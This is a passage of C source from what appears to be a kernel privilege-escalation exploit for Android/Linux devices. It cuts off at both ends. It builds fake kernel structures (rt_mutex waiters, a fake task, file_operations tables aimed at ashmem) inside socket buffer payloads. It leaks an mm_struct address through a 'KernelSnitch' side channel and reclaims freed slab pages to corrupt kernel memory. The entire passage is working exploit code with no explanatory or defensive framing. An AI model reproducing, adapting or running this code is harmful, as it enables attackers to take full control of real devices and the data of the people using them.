    slide_bank_parents[0] = fake_fops;
    slide_bank_targets[0] = data_addr(ASHMEM_MISC_FOPS);
#endif
#else
    slide_oracle_parent = fake_fops;
    slide_oracle_target = data_addr(ASHMEM_MISC_FOPS);
#endif
  }
#endif
  if (payload_mode == PAGE_PAYLOAD_FOPS) {
    fake_parent = fake_fops;
    fake_right = data_addr(ASHMEM_MISC_FOPS);
    fake_left = 0;
    binwrite_target = payload_base + SCRATCH_OFF;
  } else {
    fake_parent = data_addr(ASHMEM_MISC_FOPS) - 8;
    fake_right = fake_fops;
    fake_left = payload_base + LEFT_OFF;
    binwrite_target = payload_base + FOPS_OFF + 0x700;
  }

#ifdef SLIDE_RECLAIM_SCAN_PHASE
  if (payload_mode == PAGE_PAYLOAD_SLIDE) {
    for (size_t chunk = 0; chunk + ORDER3_SIZE <= SKB_SEND_SIZE;
         chunk += ORDER3_SIZE) {
      unsigned char *p = skb_buf + chunk;
      for (size_t off = SLIDE_RECLAIM_SCAN_PHASE;
           off + 0x20 <= ORDER3_SIZE; off += 0x20) {
        put64(p, off + 0x08, 0x4141000000000000ULL | off);
      }
    }
    return 1;
  }
#endif

  uintptr_t write_pc = fake_fops;
  uintptr_t write_right = data_addr(ASHMEM_MISC_FOPS);
  uintptr_t write_left = 0;
  uint64_t waiter_task = text_addr(INIT_TASK);
  uint64_t task_group = text_addr(ROOT_TASK_GROUP);
  uint64_t pi_top_task = text_addr(INIT_TASK);
  uint32_t waiter_prio = FAKE_WAITER_PRIO;
  if (payload_mode == PAGE_PAYLOAD_SLIDE) {
    write_pc = SLIDE_NFULNL_LOGGER_OBJECT + slide_p0_offset;
    write_right = 0;
    write_left = SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR + slide_p0_offset;
#if defined(SLIDE_USE_FAKE_TASK) && SLIDE_USE_FAKE_TASK
    waiter_task = fake_task;
    task_group = 0;
    pi_top_task = fake_task;
#else
    waiter_task = SLIDE_INIT_TASK + slide_p0_offset;
    task_group = SLIDE_ROOT_TASK_GROUP + slide_p0_offset;
    pi_top_task = SLIDE_INIT_TASK + slide_p0_offset;
#endif
    waiter_prio = SLIDE_FAKE_WAITER_PRIO;
  }

  for (size_t chunk = 0;
       chunk + SKB_FRAG_BIAS + ORDER3_SIZE <= SKB_SEND_SIZE;
       chunk += ORDER3_SIZE) {
    unsigned char *p = skb_buf + chunk + SKB_FRAG_BIAS;

    put32(p, LOCK_OFF + 0x00, 0);
    if (payload_mode == PAGE_PAYLOAD_SLIDE) {
      put64(p, LOCK_OFF + 0x08, fake_w0);
      put64(p, LOCK_OFF + 0x10, fake_w0);
      put64(p, LOCK_OFF + 0x18, SLIDE_LOCK_OWNER_VALUE);
    } else {
      put64(p, LOCK_OFF + 0x08, fake_w0);
      put64(p, LOCK_OFF + 0x10, fake_w0);
      put64(p, LOCK_OFF + 0x18, fake_task | 1);
    }

    put_fake_waiter(p, W0_OFF, 1, 0, 0, write_pc, write_right, write_left,
                    waiter_task, fake_lock, waiter_prio);

    put32(p, FAKE_TASK_OFF + FAKE_TASK_USAGE_OFF, 0x100);
    put32(p, FAKE_TASK_OFF + FAKE_TASK_PRIO_OFF, FAKE_TASK_PRIO);
    put32(p, FAKE_TASK_OFF + FAKE_TASK_NORMAL_PRIO_OFF, FAKE_TASK_PRIO);
    put32(p, FAKE_TASK_OFF + FAKE_TASK_PI_LOCK_OFF, 0);
    if (payload_mode == PAGE_PAYLOAD_FOPS) {
      put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF, 0);
      put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF + 0x08, 0);
    } else {
      put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF,
            fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF);
      put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF + 0x08,
            fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF);
    }
    put64(p, FAKE_TASK_OFF + FAKE_TASK_TASK_GROUP_OFF, task_group);
    put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_TOP_TASK_OFF, pi_top_task);
    put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_BLOCKED_ON_OFF, 0);

    put64(p, RIGHT_OFF + 0x00, fake_parent);
    put64(p, RIGHT_OFF + 0x08, 0);
    put64(p, RIGHT_OFF + 0x10, 0);

    put64(p, LEFT_OFF + 0x00, fake_parent);
    put64(p, LEFT_OFF + 0x08, 0);
    put64(p, LEFT_OFF + 0x10, 0);

    if (payload_mode == PAGE_PAYLOAD_FOPS) {
      put_fake_fops_table(p, FOPS_TABLE_OFF);
#if defined(APP_PAYLOAD) && APP_PAYLOAD && \
    defined(APP_FOPS_TABLE_MIRROR_OFF)
      /*
       * Hardware reads the marker emitted at payload offset 0xe80 at page
       * offset zero, while the stable PI geometry deliberately addresses the
       * reclaimed payload with SKB_DATA_DELTA=-0x1000.  Keep that proven
       * geometry and mirror only the file_operations bytes across the 0x180
       * gap.  The primary copy remains for the page-aligned interpretation.
       */
      put_fake_fops_table(p, APP_FOPS_TABLE_MIRROR_OFF);
#endif
#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE && \
    (!defined(APP_CLOSED_FOPS_ROUTE) || !APP_CLOSED_FOPS_ROUTE)
#if defined(APP_FOPS_ORACLE_DIAG_ONLY) && APP_FOPS_ORACLE_DIAG_ONLY
      memcpy(p + P0_ORACLE_GATE_PAGE_OFF, "RMG-P0-ORACLE-GATE", 18);
      put_slide_bank_entry(
          p, payload_base, P0_ORACLE_GATE_SLOT,
          slide_bank_parents[P0_ORACLE_GATE_SLOT],
          slide_bank_targets[P0_ORACLE_GATE_SLOT]);
      put_slide_bank_entry(
          p, payload_base, P0_ORACLE_PROBE_SLOT,
          slide_bank_parents[P0_ORACLE_PROBE_SLOT],
          slide_bank_targets[P0_ORACLE_PROBE_SLOT]);
#elif defined(APP_FOPS_DATA_ALIAS_DIAG_ONLY) && \
    APP_FOPS_DATA_ALIAS_DIAG_ONLY
      if (fops_data_probe_active) {
        memcpy(p + P0_ORACLE_GATE_PAGE_OFF, "RMG-P0-ORACLE-GATE", 18);
        for (size_t slot = 0; slot < SLIDE_BANK_SLOTS; slot++) {
          put_slide_bank_entry(p, payload_base, slot,
                               slide_bank_parents[slot],
                               slide_bank_targets[slot]);
        }
      } else {
        put_slide_bank_entry(p, payload_base, 0,
                             slide_bank_parents[0],
                             slide_bank_targets[0]);
      }
#else
      put_slide_bank_entry(p, payload_base, 0,
                           slide_bank_parents[0],
                           slide_bank_targets[0]);
#endif
#endif
    }
  }
  return 1;
}

#if defined(APP_CONTROLLED_MM_GROUP_RECLAIM) && \
    APP_CONTROLLED_MM_GROUP_RECLAIM
static uintptr_t prepare_controlled_kernel_page(int payload_mode) {
  int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
  int *target_fds;
  int shaping_sv[2] = {-1, -1};
  uintptr_t base = 0;
  int sndbuf = S918_SKB_SNDBUF;
  struct iovec iov;
  struct msghdr msg;
  struct controlled_mm_drain_state drain_state = {
      .s2 = -1,
  };
#if defined(APP_RECLAIM_TRACEFS_GATE) && APP_RECLAIM_TRACEFS_GATE
  struct reclaim_tracefs_gate trace_gate;
#endif

  close_reclaim_sockets();
  cleanup_page_prepare_state();
  mm_objs_per_slab = ORDER3_SIZE / MM_STRUCT_SZ;
  skb_buf = malloc(SKB_SEND_SIZE);
  target_fds = calloc(mm_objs_per_slab, sizeof(*target_fds));
  if (!skb_buf || !target_fds) {
    errno = ENOMEM;
    SYSCHK(-1);
  }

  if (!collect_controlled_mm_group((size_t)cpu_count, &base, target_fds)) {
    free(target_fds);
    return 0;
  }
  pr_info("controlled mm group selected base=%016zx mode=%d\n",
          base, payload_mode);
  if (!prepare_skb_payload(base, payload_mode)) {
    for (size_t i = 0; i < mm_objs_per_slab; ++i) {
      if (target_fds[i] >= 0) {
        SYSCHK(close(target_fds[i]));
      }
    }
    free(target_fds);
    return 0;
  }

  SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, reclaim_sv));
  SYSCHK(setsockopt(reclaim_sv[0], SOL_SOCKET, SO_SNDBUF,
                    &sndbuf, sizeof(sndbuf)));
  int flags = SYSCHK(fcntl(reclaim_sv[0], F_GETFL, 0));
  SYSCHK(fcntl(reclaim_sv[0], F_SETFL, flags | O_NONBLOCK));
  for (size_t pair = 0; pair + 1 < S918_RECLAIM_SOCKET_PAIRS; ++pair) {
    SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0,
                      controlled_reclaim_sv[pair]));
    controlled_reclaim_count++;
    SYSCHK(setsockopt(controlled_reclaim_sv[pair][0], SOL_SOCKET,
                      SO_SNDBUF, &sndbuf, sizeof(sndbuf)));
    flags = SYSCHK(fcntl(controlled_reclaim_sv[pair][0], F_GETFL, 0));
    SYSCHK(fcntl(controlled_reclaim_sv[pair][0], F_SETFL,
                 flags | O_NONBLOCK));
  }

  memset(&iov, 0, sizeof(iov));
  iov.iov_base = skb_buf;
  iov.iov_len = SKB_SEND_SIZE;
  memset(&msg, 0, sizeof(msg));
  msg.msg_iov = &iov;
  msg.msg_iovlen = 1;

  SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, shaping_sv));
  ssize_t shaped = sendmsg(shaping_sv[0], &msg, 0);
  if (shaped != (ssize_t)SKB_SEND_SIZE) {
    if (shaped >= 0) {
      errno = EIO;
    }
    SYSCHK(-1);
  }
  pr_info("controlled skb shape sent bytes=%zd cpu=%d\n",
          shaped, sched_getcpu());

#if defined(APP_RECLAIM_TRACEFS_GATE) && APP_RECLAIM_TRACEFS_GATE
  if (!reclaim_tracefs_start(base, &trace_gate)) {
    for (size_t i = 0; i < mm_objs_per_slab; ++i) {
      if (target_fds[i] >= 0) {
        SYSCHK(close(target_fds[i]));
      }
    }
    free(target_fds);
    close_reclaim_sockets();
    return 0;
  }
#endif

  if (!drain_controlled_mm_group(target_fds, &drain_state, shaping_sv)) {
    free(target_fds);
    return 0;
  }

  int sent_count = 0;
  int stop_errno = 0;
  for (size_t pair = 0; pair < S918_RECLAIM_SOCKET_PAIRS; ++pair) {
    int sender = pair ? controlled_reclaim_sv[pair - 1][0] : reclaim_sv[0];
    for (int send_index = 0; send_index < S918_SKB_SENDS; ++send_index) {
      errno = 0;
      ssize_t sent = sendmsg(sender, &msg, MSG_DONTWAIT);
      if (sent != (ssize_t)SKB_SEND_SIZE) {
        stop_errno = errno;
        break;
      }
      sent_count++;
    }
  }
#if defined(APP_RECLAIM_TRACEFS_GATE) && APP_RECLAIM_TRACEFS_GATE
  int trace_ok = reclaim_tracefs_finish(&trace_gate);
#endif
  release_controlled_mm_drain(&drain_state);
  free(target_fds);
  pr_info("controlled skb reclaim sends=%d pairs=%d per_pair=%d stop_errno=%d base=%016zx mode=%d\n",
          sent_count, S918_RECLAIM_SOCKET_PAIRS, S918_SKB_SENDS,
          stop_errno, base, payload_mode);
#if defined(APP_RECLAIM_TRACEFS_GATE) && APP_RECLAIM_TRACEFS_GATE
  if (!trace_ok) {
    close_reclaim_sockets();
    return 0;
  }
#endif
  return sent_count ? base : 0;
}
#endif

#if defined(APP_PHYS_VIRTUAL_BASE_ORACLE) && APP_PHYS_VIRTUAL_BASE_ORACLE
static void cleanup_failed_kernel_page(const char *reason) {
  pr_info("kernel page cleanup failure=%s stage=kernelsnitch begin\n", reason);
  kernelsnitch_cleanup(ks);
  ks = NULL;
  pr_info("kernel page cleanup failure=%s stage=kernelsnitch done\n", reason);
  pr_info("kernel page cleanup failure=%s stage=prepare-children begin count=%zu\n",
          reason, prepare_ctx.mm_cnt);
  for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
    kill_child(prepare_ctx.childs[i]);
  }
  pr_info("kernel page cleanup failure=%s stage=prepare-children done\n", reason);
  cleanup_page_prepare_state();
}
#endif

uintptr_t prepare_kernel_page(int payload_mode) {
#if defined(APP_CONTROLLED_MM_GROUP_RECLAIM) && \
    APP_CONTROLLED_MM_GROUP_RECLAIM
  return prepare_controlled_kernel_page(payload_mode);
#else
  close_reclaim_sockets();
#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
  cleanup_page_prepare_state();
#endif
  mm_objs_per_slab = ORDER3_SIZE / MM_STRUCT_SZ;
  prepare_ctxs();
#if defined(APP_CLOSED_SLABINFO_TOUCH) && APP_CLOSED_SLABINFO_TOUCH
  touch_mm_slabinfo();
#endif

  skb_buf = malloc(SKB_SEND_SIZE);
  memset(skb_buf, 0x41, SKB_SEND_SIZE);

  for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
    prepare_ctx.childs[i] = clone_child();
  }
  for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
    prepare_ctx.memfds[i] = open_memfd(prepare_ctx.childs[i]);
  }

  for (size_t i = 0; i < spray_ctx.mm_cnt; i++) {
    spray_ctx.childs[i] = clone_child();
    spray_ctx.memfds[i] = open_memfd(spray_ctx.childs[i]);
  }
#if defined(APP_CLOSED_SLABINFO_TOUCH) && APP_CLOSED_SLABINFO_TOUCH
  touch_mm_slabinfo();
#endif

  int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
  ks = kernelsnitch_setup(
      MM_STRUCT_SZ, MM_ORDER, cpu_count, KSNITCH_COLLISIONS,
      KERNELSNITCH_VERBOSE, KERNELSNITCH_MTE_ENABLED);
#if defined(APP_PAYLOAD) && APP_PAYLOAD && \
    defined(APP_KERNEL_PAGE_KSNITCH_IDENTITY_END) && \
    defined(APP_KERNEL_PAGE_KSNITCH_EXACT_PARTITION)
  size_t search_min_object_index = APP_FOPS_MIN_OBJECT_INDEX;
  size_t search_max_object_index = mm_objs_per_slab - 1;
  if (payload_mode == PAGE_PAYLOAD_SLIDE) {
    search_min_object_index = APP_SLIDE_MIN_OBJECT_INDEX;
    search_max_object_index = APP_SLIDE_MAX_OBJECT_INDEX;
  }
  kernelsnitch_set_search_bounds(
      ks, KERNELSNITCH_IDENTITY_START,
      APP_KERNEL_PAGE_KSNITCH_IDENTITY_END,
      search_min_object_index, search_max_object_index,
      APP_KERNEL_PAGE_KSNITCH_EXACT_PARTITION);
#endif
  configure_kernelsnitch_profile(ks, payload_mode);
#else
  ks = kernelsnitch_setup(
      MM_STRUCT_SZ, MM_ORDER, cpu_count, KSNITCH_COLLISIONS, 0, 0);
#if defined(APP_PAYLOAD) && APP_PAYLOAD && \
    defined(SLIDE_KSNITCH_APPENDED_FUTEXES)
  if (payload_mode == PAGE_PAYLOAD_SLIDE) {
    kernelsnitch_set_profile(
        ks, SLIDE_KSNITCH_APPENDED_FUTEXES,
        SLIDE_KSNITCH_REPEAT_MEASUREMENT,
        SLIDE_KSNITCH_AVERAGE);
  }
#endif
#endif

  for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
    pre_ctx.childs[i] = clone_child();
  }
  child_leak = clone_leak_child();
  for (size_t i = 0; i < post_ctx.mm_cnt; i++) {
    post_ctx.childs[i] = clone_child();
  }

  for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
    pre_ctx.memfds[i] = open_memfd(pre_ctx.childs[i]);
  }
  memfd_leak = open_memfd(child_leak);
  for (size_t i = 0; i < post_ctx.mm_cnt; i++) {
    post_ctx.memfds[i] = open_memfd(post_ctx.childs[i]);
  }
#if defined(APP_CLOSED_SLABINFO_TOUCH) && APP_CLOSED_SLABINFO_TOUCH
  touch_mm_slabinfo();
#endif

  for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
    kill_child(pre_ctx.childs[i]);
    pre_ctx.childs[i] = -1;
  }
  for (size_t i = 0; i < post_ctx.mm_cnt; i++) {
    kill_child(post_ctx.childs[i]);
    post_ctx.childs[i] = -1;
  }
  for (size_t i = 0; i < spray_ctx.mm_cnt; i++) {
    kill_child(spray_ctx.childs[i]);
    spray_ctx.childs[i] = -1;
  }
  SYSCHK(waitpid(child_leak, NULL, 0));
#if defined(APP_CLOSED_SLABINFO_TOUCH) && APP_CLOSED_SLABINFO_TOUCH
  touch_mm_slabinfo();
#endif
#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
  log_mm_slabinfo("after-child-exit");
#endif

  if (!kernelsnitch_found_collisions(ks)) {
    pr_warning("KernelSnitch collision finding failed\n");
#if defined(APP_PHYS_VIRTUAL_BASE_ORACLE) && APP_PHYS_VIRTUAL_BASE_ORACLE
    cleanup_failed_kernel_page("collision");
#else
    kernelsnitch_cleanup(ks);
    ks = NULL;
    for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
      kill_child(prepare_ctx.childs[i]);
    }
    cleanup_page_prepare_state();
#endif
    return 0;
  }

  kernelsnitch_bruteforce(ks);
  uintptr_t leaked = ks->mm_struct;
  if (leaked == (uintptr_t)-1) {
    pr_warning("KernelSnitch mm_struct leak failed\n");
#if defined(APP_PHYS_VIRTUAL_BASE_ORACLE) && APP_PHYS_VIRTUAL_BASE_ORACLE
    cleanup_failed_kernel_page("mm-leak");
#else
    kernelsnitch_cleanup(ks);
    ks = NULL;
    for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
      kill_child(prepare_ctx.childs[i]);
    }
    cleanup_page_prepare_state();
#endif
    return 0;
  }
#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
  leaked = canonicalize_kernelsnitch_pointer(leaked);
  log_mm_slabinfo("after-leak");
#endif

  uintptr_t base = leaked & ~(ORDER3_SIZE - 1);
#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
  size_t object_index = (leaked - base) / MM_STRUCT_SZ;
  pr_info("mm leaked=%016zx base=%016zx object_index=%zu\n",
          leaked, base, object_index);
#if defined(APP_PAYLOAD) && APP_PAYLOAD && \
    defined(APP_RECLAIM_MAX_DIRECT_BASE)
  if (base >= APP_RECLAIM_MAX_DIRECT_BASE) {
    pr_warning("mm reclaim candidate rejected mode=%d base=%016zx max=%016llx\n",
               payload_mode, base,
               (unsigned long long)APP_RECLAIM_MAX_DIRECT_BASE);
    kernelsnitch_cleanup(ks);
    ks = NULL;
    for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
      kill_child(prepare_ctx.childs[i]);
    }
    cleanup_page_prepare_state();
    return 0;
  }
#endif
#if defined(APP_PAYLOAD) && APP_PAYLOAD && \
    defined(APP_SLIDE_MIN_OBJECT_INDEX)
  if (payload_mode == PAGE_PAYLOAD_SLIDE &&
      object_index < APP_SLIDE_MIN_OBJECT_INDEX) {
    pr_warning("mm slide candidate rejected object_index=%zu min=%d\n",
               object_index, APP_SLIDE_MIN_OBJECT_INDEX);
    kernelsnitch_cleanup(ks);
    ks = NULL;
    for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
      kill_child(prepare_ctx.childs[i]);
    }
    cleanup_page_prepare_state();
    return 0;
  }
#endif
#if defined(APP_PAYLOAD) && APP_PAYLOAD && \
    defined(APP_SLIDE_MAX_OBJECT_INDEX)
  if (payload_mode == PAGE_PAYLOAD_SLIDE &&
      object_index > APP_SLIDE_MAX_OBJECT_INDEX) {
    pr_warning("mm slide candidate rejected object_index=%zu max=%d\n",
               object_index, APP_SLIDE_MAX_OBJECT_INDEX);
    kernelsnitch_cleanup(ks);
    ks = NULL;
    for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
      kill_child(prepare_ctx.childs[i]);
    }
    cleanup_page_prepare_state();
    return 0;
  }
#endif
#if defined(APP_PAYLOAD) && APP_PAYLOAD && \
    defined(APP_FOPS_MIN_OBJECT_INDEX)
  if (payload_mode == PAGE_PAYLOAD_FOPS &&
      object_index < APP_FOPS_MIN_OBJECT_INDEX) {
    pr_warning("mm fops candidate rejected object_index=%zu min=%d\n",
               object_index, APP_FOPS_MIN_OBJECT_INDEX);
    kernelsnitch_cleanup(ks);
    ks = NULL;
    for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
      kill_child(prepare_ctx.childs[i]);
    }
    cleanup_page_prepare_state();
    return 0;
  }
#endif
#else
  pr_info("mm leaked=%016zx base=%016zx object_index=%zu\n",
          leaked, base, (leaked - base) / MM_STRUCT_SZ);
#endif
  int slide_bank_configured = 1;
#if defined(APP_PAYLOAD) && APP_PAYLOAD && \
    defined(SLIDE_P0_OFFSET_CANDIDATES)
  slide_bank_configured =
      configure_slide_bank_geometry(leaked, payload_mode);
#endif
  if (!slide_bank_configured || !prepare_skb_payload(base, payload_mode)) {
#if defined(APP_PHYS_VIRTUAL_BASE_ORACLE) && APP_PHYS_VIRTUAL_BASE_ORACLE
    cleanup_failed_kernel_page("skb-payload");
#else
    kernelsnitch_cleanup(ks);
    ks = NULL;
    for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
      kill_child(prepare_ctx.childs[i]);
    }
    cleanup_page_prepare_state();
#endif
    return 0;
  }

  SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, reclaim_sv));
#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
#ifdef APP_SLIDE_RECLAIM_SNDBUF
  int sndbuf = APP_SLIDE_RECLAIM_SNDBUF;
#else
  int sndbuf = 1 << 20;
#endif
  errno = 0;
  int sndbuf_set_ret =
      setsockopt(reclaim_sv[0], SOL_SOCKET, SO_SNDBUF, &sndbuf,
                 sizeof(sndbuf));
  int sndbuf_set_errno = errno;
  socklen_t sndbuf_len = sizeof(sndbuf);
  int sndbuf_effective = 0;
  errno = 0;
  int sndbuf_get_ret =
      getsockopt(reclaim_sv[0], SOL_SOCKET, SO_SNDBUF, &sndbuf_effective,
                 &sndbuf_len);
  int sndbuf_get_errno = errno;
  pr_info("sk_buff reclaim sndbuf request=%d effective=%d "
          "set_ret=%d set_errno=%d get_ret=%d get_errno=%d\n",
          sndbuf, sndbuf_effective, sndbuf_set_ret, sndbuf_set_errno,
          sndbuf_get_ret, sndbuf_get_errno);
#else
  int sndbuf = 1 << 20;
  setsockopt(reclaim_sv[0], SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
#endif
  int reclaim_flags = fcntl(reclaim_sv[0], F_GETFL, 0);
  if (reclaim_flags >= 0) {
    fcntl(reclaim_sv[0], F_SETFL, reclaim_flags | O_NONBLOCK);
  }
  int pcp_shaping_sv[2];
  SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, pcp_shaping_sv));

  struct iovec iov;
  memset(&iov, 0, sizeof(iov));
  iov.iov_base = skb_buf;
  iov.iov_len = SKB_SEND_SIZE;

  struct msghdr msg;
  memset(&msg, 0, sizeof(msg));
  msg.msg_iov = &iov;
  msg.msg_iovlen = 1;

  SYSCHK(sendmsg(pcp_shaping_sv[0], &msg, 0));
#if defined(APP_CLOSED_SLABINFO_TOUCH) && APP_CLOSED_SLABINFO_TOUCH
  touch_mm_slabinfo();
#endif
#if defined(APP_QUIET_RECLAIM_WINDOW) && APP_QUIET_RECLAIM_WINDOW
  /*
   * Make the target-release-to-skb-reclaim interval free of stdio flushes.
   * stdout is a regular-file stream under the payload runner, so an otherwise
   * harmless diagnostic can cross its buffer boundary at a nondeterministic
   * point and allocate while the order-3 page is briefly in the buddy.
   */
  SYSCHK(fflush(NULL));
#endif

  pin_to_core(CORE);
  sched_yield();
  sched_yield();
  sched_yield();
  sched_yield();
  size_t early_drain_triggers = 0;
#ifdef APP_MM_EARLY_DRAIN_TRIGGERS
  early_drain_triggers = APP_MM_EARLY_DRAIN_TRIGGERS;
  size_t early_prepare_slabs = prepare_ctx.mm_cnt / mm_objs_per_slab;
  if (early_drain_triggers > early_prepare_slabs) {
    early_drain_triggers = early_prepare_slabs;
  }
  for (size_t i = 0; i < early_drain_triggers; i++) {
    size_t index = i * mm_objs_per_slab;
    SYSCHK(close(prepare_ctx.memfds[index]));
    prepare_ctx.memfds[index] = -1;
    kill_child(prepare_ctx.childs[index]);
    prepare_ctx.childs[index] = -1;
  }
#if !defined(APP_CLOSED_RECLAIM_QUIET) || !APP_CLOSED_RECLAIM_QUIET
  pr_info("mm early cpu-partial drain triggers=%zu\n", early_drain_triggers);
#endif
#endif
#if defined(APP_CLOSED_SLABINFO_TOUCH) && APP_CLOSED_SLABINFO_TOUCH
  touch_mm_slabinfo();
#endif
  for (size_t i = 0; i < spray_ctx.mm_cnt; i += mm_objs_per_slab) {
    SYSCHK(close(spray_ctx.memfds[i]));
    spray_ctx.memfds[i] = -1;
  }
  size_t target_pre = pre_ctx.mm_cnt - 1;
  SYSCHK(close(pre_ctx.memfds[target_pre]));
  pre_ctx.memfds[target_pre] = -1;
  SYSCHK(close(post_ctx.memfds[0]));
  post_ctx.memfds[0] = -1;
#if !(defined(APP_QUIET_RECLAIM_WINDOW) && APP_QUIET_RECLAIM_WINDOW) && \
    (!defined(APP_CLOSED_RECLAIM_QUIET) || !APP_CLOSED_RECLAIM_QUIET)
  pr_info("mm target-neighbor slab queued for late drain\n");
#endif
  for (size_t i = 0; i < target_pre; i++) {
    SYSCHK(close(pre_ctx.memfds[i]));
    pre_ctx.memfds[i] = -1;
  }
  for (size_t i = 1; i < post_ctx.mm_cnt - 1; i++) {
    SYSCHK(close(post_ctx.memfds[i]));
    post_ctx.memfds[i] = -1;
  }
#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION && \
    !(defined(APP_QUIET_RECLAIM_WINDOW) && APP_QUIET_RECLAIM_WINDOW)
  log_mm_slabinfo("after-target-neighbors");
#endif

  SYSCHK(close(pcp_shaping_sv[0]));
  SYSCHK(close(pcp_shaping_sv[1]));
  sched_yield();
  sched_yield();
  sched_yield();
  sched_yield();
#if defined(APP_CLOSED_SLABINFO_TOUCH) && APP_CLOSED_SLABINFO_TOUCH
  touch_mm_slabinfo();
#endif
  SYSCHK(close(memfd_leak));
  memfd_leak = -1;
#if defined(APP_CLOSED_SLABINFO_TOUCH) && APP_CLOSED_SLABINFO_TOUCH
  touch_mm_slabinfo();
#endif
  size_t prepare_slabs = prepare_ctx.mm_cnt / mm_objs_per_slab;
  size_t drain_start = early_drain_triggers;
  size_t drain_triggers = prepare_slabs - drain_start;
#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
#ifdef APP_MM_LATE_DRAIN_TRIGGERS
  drain_triggers = APP_MM_LATE_DRAIN_TRIGGERS;
#endif
  pid_t deferred_reap_children[drain_triggers ? drain_triggers : 1];
  size_t deferred_reap_count = 0;
  memset(deferred_reap_children, 0, sizeof(deferred_reap_children));
#endif
  for (size_t i = 0; i < drain_triggers; i++) {
    size_t index = (drain_start + i) * mm_objs_per_slab;
    SYSCHK(close(prepare_ctx.memfds[index]));
    prepare_ctx.memfds[index] = -1;
#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
#if (defined(APP_DEFER_ALL_DRAIN_REAPS) && \
     APP_DEFER_ALL_DRAIN_REAPS) || \
    (defined(APP_DEFER_FINAL_DRAIN_REAP) && \
     APP_DEFER_FINAL_DRAIN_REAP)
    int defer_reap = 0;
#if defined(APP_DEFER_ALL_DRAIN_REAPS) && APP_DEFER_ALL_DRAIN_REAPS
    defer_reap = 1;
#elif defined(APP_DEFER_FINAL_DRAIN_REAP) && APP_DEFER_FINAL_DRAIN_REAP
    defer_reap = i + 1 == drain_triggers;
#endif
    if (defer_reap) {
      pid_t child = prepare_ctx.childs[index];
      SYSCHK(kill(child, SIGKILL));
      siginfo_t child_info;
      memset(&child_info, 0, sizeof(child_info));
      int wait_ret;
      do {
        wait_ret = waitid(P_PID, child, &child_info,
                          WEXITED | WNOWAIT);
      } while (wait_ret < 0 && errno == EINTR);
      SYSCHK(wait_ret);
      deferred_reap_children[deferred_reap_count++] = child;
      prepare_ctx.childs[index] = -1;
#if !(defined(APP_QUIET_RECLAIM_WINDOW) && APP_QUIET_RECLAIM_WINDOW)
      pr_info("mm drain child exited deferred-reap trigger=%zu/%zu pid=%d "
              "code=%d status=%d\n",
              i + 1, drain_triggers, child, child_info.si_code,
              child_info.si_status);
#endif
      continue;
    }
#endif
#endif
    kill_child(prepare_ctx.childs[index]);
    prepare_ctx.childs[index] = -1;
  }
#if defined(APP_CLOSED_SLABINFO_TOUCH) && APP_CLOSED_SLABINFO_TOUCH
  touch_mm_slabinfo();
#endif
#if !defined(APP_REQUIRE_FRESH_P0_SESSION) || !APP_REQUIRE_FRESH_P0_SESSION
#if !defined(APP_CLOSED_RECLAIM_QUIET) || !APP_CLOSED_RECLAIM_QUIET
  pr_info("mm late cpu-partial drain triggers=%zu\n", drain_triggers);
#endif
#endif
  int reclaim_sends = SKB_RECLAIM_SENDS;
  int reclaim_sent = 0;
#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
  int reclaim_errno = 0;
#endif
  for (int i = 0; i < reclaim_sends; i++) {
    errno = 0;
    ssize_t sent = sendmsg(reclaim_sv[0], &msg, MSG_DONTWAIT);
    if (sent <= 0) {
#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
      reclaim_errno = errno;
#endif
      break;
    }
    reclaim_sent++;
  }
#if defined(APP_CLOSED_SLABINFO_TOUCH) && APP_CLOSED_SLABINFO_TOUCH
  touch_mm_slabinfo();
#endif
#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
